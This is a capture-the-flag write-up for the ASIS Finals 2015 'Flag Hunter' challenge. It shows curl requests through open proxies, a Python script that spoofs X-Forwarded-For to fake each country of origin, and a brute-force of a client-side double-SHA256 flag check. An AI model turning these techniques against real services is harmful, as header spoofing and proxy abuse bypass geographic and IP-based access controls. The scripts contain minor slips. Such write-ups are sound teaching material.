---
title: "ASIS CTF Finals 2015 - Flag Hunter (Misc)"
header:
  overlay_image: /assets/images/asisfinals2015/flaghunter/header.png
  overlay_filter: 0.5
tags:
  - asisfinals2015
  - writeup
  - misc
---

Use of the `X-Forwarded-For` header allows an attacker to fake country of origin
to collect flags.

## Challenge Description

#### Points

75

#### Solves

53

#### Description

```
Be a hunter and find the flag.
```

## Solution

The link is at: http://flaghunt.asis-ctf.ir/. So we're given a map that lets you
click on different countries.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/flaghunter/1.png){: .align-center}

If you click on a country that is not your own, you get a failure message.

![2]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/flaghunter/2.png){: .align-center}

Well, Singapore's not on the map, so let's make the request manually.

```javascript
code = "SG"

var data = {
    "code": code
};
data = $(this).serialize() + "&" + $.param(data);
$.ajax({
    type: "POST",
    dataType: "html",
    url: "a.php", //Relative or absolute path to response.php file
    data: data,
    success: function(data) {
        alert(data);
    }
});
console.log(code);
```

![3]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/flaghunter/3.png){: .align-center}

We get some hex digits. Now, if we try a proxy in the United States, and we
click on the US in the map, we get a different bunch of hex digits.

![4]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/flaghunter/4.png){: .align-center}

Hmmm, well, we can do this from the command line to make this faster. So let's
grab some IPs off the web and use curl.

```shell
$ curl --data "&code=SG" -x 210.51.48.206:3128 http://flaghunt.asis-ctf.ir/a.php
c99801
```

However, some proxies don't work.

```shell
$ curl --data "&code=KA" -x 213.157.39.202:3130
http://flaghunt.asis-ctf.ir/a.php
We do not answer to long distance calls
```

Let's find out why.

```shell
$ curl --data "&code=KA" -x 213.157.39.202:3130 http://codesinverse.com:1337
... and in another window ...
$ nc -l -p 1337
POST / HTTP/1.1
User-Agent: curl/7.35.0
Host: codesinverse.com:1337
Accept: */*
Content-Length: 8
Content-Type: application/x-www-form-urlencoded
X-Proxy-ID: 1119486735
X-Forwarded-For: 101.127.41.144
Via: 1.1 213.157.39.202 (Mikrotik HttpProxy)

&code=KA
```

Looks like there's an `X-Forwarded-For` header that's pointing to my Singaporean
IP. Sooo, we could spoof IP addresses by using the `X-Forwarded-For` header! Now,
we can obtain a list of IP blocks by geographic location and make requests to
collect all possible hex digit codes. So, I grabbed this database:
http://dev.maxmind.com/geoip/geoip2/geolite2/ and wrote the following script to
parse the .csv files and make the requests.

```python
import requests

def process_location(l):
    tokens = l.split(",")
    return (tokens[0], tokens[4], tokens[5])

def process_lips(data):
    lines = data.strip().split("\n")
    lips = {}
    for i in lines:
        tokens = i.split(",")
        if tokens[1] in lips.keys():
            lips[tokens[1]].append(tokens[0])
        else:
            lips[tokens[1]] = [tokens[0]]
    return lips

def make_request(cc, ip):
    payload = {'code': cc}
    forward = {'X-Forwarded-For': ip}
    r = requests.post("http://flaghunt.asis-ctf.ir/a.php", data=payload,
            headers=forward)
    return r.text

def main():
    # Make database of locations
    loc = file("./GeoLite2-Country-CSV_20151006"
    "/GeoLite2-Country-Locations-en.csv").read()
    locs = [process_location(i) for i in loc.split("\n")[1:-1]]

    # Make database of locationip/address mapping
    lic = file("./GeoLite2-Country-CSV_20151006"
    "/GeoLite2-Country-Blocks-IPv4.csv").read()
    lics = process_lips(lic)

    codes = []
    # Let's process the countries
    for i in locs:
        ip = lics[i[0]][0]
        ip = ip.split("/")[0]
        code = i[1]
        hunt = make_request(code, ip)
        codes = (i, hunt)
        print "Found: ", i, hunt

    print codes

if __name__ == "__main__":
    main()
```

Running the code:

```shell
$ python flaghunt.py
Found:  ('49518', 'RW', 'Rwanda') c99801
Found:  ('51537', 'SO', 'Somalia') 926c51
Found:  ('69543', 'YE', 'Yemen') f55101
Found:  ('99237', 'IQ', 'Iraq') f55101
Found:  ('102358', 'SA', '"Saudi Arabia"') fc
Found:  ('130758', 'IR', 'Iran') c99801
Found:  ('146669', 'CY', 'Cyprus') 926c51
Found:  ('149590', 'TZ', 'Tanzania') fc
Found:  ('163843', 'SY', 'Syria') 926c51
Found:  ('174982', 'AM', 'Armenia') 926c51
Found:  ('192950', 'KE', 'Kenya') fc
Found:  ('203312', 'CD', 'Congo') f55101
Found:  ('223816', 'DJ', 'Djibouti') f55101
Found:  ('226074', 'UG', 'Uganda') bf853b
Found:  ('239880', 'CF', '"Central African Republic"') c99801
Found:  ('241170', 'SC', 'Seychelles') bf853b
Found:  ('248816', 'JO', '"Hashemite Kingdom of Jordan"') f55101
Found:  ('272103', 'LB', 'Lebanon') fc
Found:  ('285570', 'KW', 'Kuwait') bf853b
Found:  ('286963', 'OM', 'Oman') 353c45
Found:  ('289688', 'QA', 'Qatar') We do not answer to long distance calls
Found:  ('290291', 'BH', 'Bahrain') c99801
Found:  ('290557', 'AE', '"United Arab Emirates"') bf853b
```

If you look closely, there are six possible answers: bf853b, c99801, 353c45,
926c51, f55101, fc. This just so happens to be perfectly fitting for an MD5
hash. So this could be our flag. Assuming fc is our last block, that's 120
permutations. Too many to enter manually on the scoreboard. So let's metagame a
bit and look at the scoreboard.

If we look at how the flag is validated, it isn't immediately submitted as a
request to the scoreboard. There is some client side validation of the flag.

![5]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/flaghunter/5.png){: .align-center}
![6]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/flaghunter/6.png){: .align-center}

So, before the flag is submitted, it is `sha256(sha256(flag_candidate))` and
checked against a hidden `id_check` value. We can use this to discern which
permutation is correct! (Note the `id_check` is different since I can't get the
previous value as the solved challenge doesn't have the field) The following
script does that:

```python
import itertools
import hashlib

f = []
for i in itertools.permutations("bf853b c99801 353c45 926c51 f55101".split()):
        f.append("ASIS{ %sfc}" % "".join(i))

hashed = "3f87d0f31342fb9f7f96e35e8752536ebf3680441b5018c419c8ee3c1e1077db"
for i in f:
    if hashlib.sha256(hashlib.sha256(i).hexdigest()).hexdigest() == hashed:
        print i
```

Running the script:

```shell
$ python find_perm.py
ASIS{926c51bf853b353c45f55101c99801fc}
```

Flag: **ASIS{926c51bf853b353c45f55101c99801fc}**



